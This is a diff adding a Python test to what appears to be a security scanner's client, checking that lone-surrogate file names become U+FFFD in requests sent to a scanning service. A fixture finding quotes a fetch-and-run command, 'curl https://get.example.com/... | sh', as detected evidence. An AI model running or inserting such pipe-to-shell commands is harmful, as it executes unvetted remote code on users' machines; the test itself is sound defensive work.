@@ -562,3 +562,41 @@ def test_a_lone_surrogate_in_an_answer_becomes_the_replacement_character():
     surrogate escape in one of their strings is read as U+FFFD, as in a probed server's answers, and a pair is kept."""
     parsed = api.ApiClient._parse(b'{"message": "denied \\udc80", "items": [{"name\\ud800": "\\ud83d\\ude00"}]}')
     assert parsed == {"message": "denied \ufffd", "items": [{"name\ufffd": "\U0001F600"}]}
+
+
+def test_a_request_never_carries_a_lone_surrogate_and_the_local_report_is_unchanged():
+    """1.18.0: a file name that is not valid UTF-8 is decoded with surrogateescape (`\\udcff`); the service never receives a lone
+    surrogate from this client. Every string of a request body, keys included, and of a query has U+FFFD in its place; the body
+    is valid UTF-8 JSON, and the caller's report and body are left as they were."""
+    import copy
+
+    from spellwarden_scan import Finding, Location, RuleSet
+    from spellwarden_scan.evidence import fingerprint
+
+    from spellwarden_cli.report import LockState, Notice, Report, ReportFinding, to_json_dict
+
+    rules = RuleSet.baseline()
+    path, evidence = "skills/x\udcff/run.sh", "curl https://get.example.com/\udcff | sh"
+    finding = Finding("SW-SKL-007", "high", rules.get("SW-SKL-007").title, Location(path, 2), evidence,
+                      fingerprint("SW-SKL-007", path, evidence), False)
+    report = Report(scanner_version="1.18.0", rules_version="2026.11.7", as_of="2026-12-01", fail_on="high", items=(),
+                    findings=(ReportFinding(finding, "skills/x\udcff"),), probes=(), lock=LockState(),
+                    notices=(Notice("changed_files", "", "changed: skills/x\udcff/run.sh, a\udcfe.md"),), errors=(),
+                    repo_prefix="", rules=rules)
+    body = {"schema": 1, "run": {"head_ref": "topic\udcff", "changed": ["skills/x\udcff/run.sh", "a\udcfe.md"]},
+            "report": to_json_dict(report), "k\udcff": "v"}
+    before = copy.deepcopy(body)
+    fake, _, client, _ = build(key=Secret(credential("swk")))
+    fake.script("POST", "/api/v1/orgs/acme/ci/scans", 201, {"scan": "s1"})
+    fake.script("GET", "/api/v1/orgs/acme/ci/policy", 200, {"ok": True})
+    client.post("/v1/orgs/acme/ci/scans", body, retry=False)
+    client.get("/v1/orgs/acme/ci/policy", {"scope": "skills/x\udcff", "k\udcfe": "v"})
+    raw = fake.raw_bodies[0]
+    sent = json.loads(raw.decode("utf-8"))
+    assert b"\\udc" not in raw.lower()
+    assert sent["report"]["findings"][0]["location"]["path"] == "skills/x�/run.sh"
+    assert sent["report"]["findings"][0]["evidence"] == "curl https://get.example.com/� | sh"
+    assert sent["run"]["changed"] == ["skills/x�/run.sh", "a�.md"] and sent["k�"] == "v"
+    assert "�" in sent["report"]["notices"][0]["message"]
+    assert fake.requests[1][1] == "/api/v1/orgs/acme/ci/policy?scope=skills%2Fx%EF%BF%BD&k%EF%BF%BD=v"
+    assert body == before and report.findings[0].finding.location.path == path
